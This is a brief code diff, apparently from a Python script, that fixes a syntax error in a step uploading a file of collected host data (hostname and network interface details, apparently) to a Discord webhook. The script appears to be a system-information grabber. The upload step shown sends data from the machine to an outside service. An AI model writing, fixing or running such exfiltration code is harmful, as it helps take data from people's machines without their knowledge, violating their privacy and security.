@@ -55,7 +55,7 @@ for i in rawnics:
 f.close()
 
 #Uploads to discord 
-if Upload_method == 'discord'
+if Upload_method == 'discord':
     webhook = DiscordWebhook(url=hook, content='Data collected from '+hostname+'.')
     with open(hostname+'.txt', "rb") as f:
         webhook.add_file(file=f.read(), filename=hostname+'.txt')
